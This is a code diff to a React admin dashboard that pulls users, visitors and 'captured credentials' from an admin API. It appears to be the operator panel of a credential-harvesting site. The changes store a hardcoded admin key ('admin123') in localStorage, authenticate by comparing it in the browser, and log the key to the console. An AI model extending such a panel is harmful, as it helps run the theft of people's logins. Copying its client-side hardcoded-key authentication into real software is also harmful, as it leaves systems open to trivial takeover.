@@ -5,8 +5,8 @@ import io from 'socket.io-client';
 const SOCKET_URL = process.env.REACT_APP_SOCKET_URL || 'http://localhost:5001';
 
 const AdminDashboard = () => {
-  const [adminKey, setAdminKey] = useState('');
-  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [adminKey, setAdminKey] = useState(localStorage.getItem('adminKey') || '');
+  const [isAuthenticated, setIsAuthenticated] = useState(localStorage.getItem('adminKey') === 'admin123');
   const [users, setUsers] = useState([]);
   const [activeUsers, setActiveUsers] = useState([]);
   const [userCredentials, setUserCredentials] = useState([]);
@@ -15,6 +15,16 @@ const AdminDashboard = () => {
   const [analytics, setAnalytics] = useState(null);
   const [realTimeActivity, setRealTimeActivity] = useState([]);
   const [loading, setLoading] = useState(false);
+
+  // Check if already authenticated and fetch data on mount
+  useEffect(() => {
+    const savedKey = localStorage.getItem('adminKey');
+    if (savedKey === 'admin123') {
+      setIsAuthenticated(true);
+      setAdminKey(savedKey);
+      fetchAllData(savedKey);
+    }
+  }, []);
 
   useEffect(() => {
     // Initialize socket connection for real-time monitoring
@@ -47,8 +57,9 @@ const AdminDashboard = () => {
     try {
       // Validate admin key and fetch all data
       if (adminKey === 'admin123') {
+        localStorage.setItem('adminKey', adminKey);
         setIsAuthenticated(true);
-        await fetchAllData();
+        await fetchAllData(adminKey);
       } else {
         alert('Invalid admin key');
       }
@@ -60,23 +71,23 @@ const AdminDashboard = () => {
     }
   };
 
-  const fetchAllData = async () => {
+  const fetchAllData = async (key = adminKey) => {
     try {
       console.log('=== Fetching Admin Data ===');
-      console.log('Admin Key:', adminKey);
+      console.log('Admin Key:', key);
       console.log('API Base URL:', process.env.REACT_APP_API_URL || 'http://localhost:5001/api');
       
       // Fetch all admin data
       const [usersRes, capturedCredsRes, visitorsRes] = await Promise.all([
-        adminAPI.getUsers(adminKey).catch((err) => {
+        adminAPI.getUsers(key).catch((err) => {
           console.error('Error fetching users:', err);
           return { data: { users: [] } };
         }),
-        adminAPI.getCapturedCredentials(adminKey).catch((err) => {
+        adminAPI.getCapturedCredentials(key).catch((err) => {
           console.error('Error fetching captured credentials:', err);
           return { data: { credentials: [] } };
         }),
-        adminAPI.getVisitors(adminKey).catch((err) => {
+        adminAPI.getVisitors(key).catch((err) => {
           console.error('Error fetching visitors:', err);
           return { data: { visitors: [] } };
         })
@@ -179,7 +190,18 @@ const AdminDashboard = () => {
               {activeUsers.length} Active Users
             </div>
             <button 
-              onClick={() => setIsAuthenticated(false)}
+              onClick={() => fetchAllData()}
+              className="btn btn-primary"
+              style={{ fontSize: '14px', padding: '8px 16px' }}
+            >
+              🔄 Refresh Data
+            </button>
+            <button 
+              onClick={() => {
+                localStorage.removeItem('adminKey');
+                setIsAuthenticated(false);
+                setAdminKey('');
+              }}
               className="btn btn-outline"
             >
               Logout
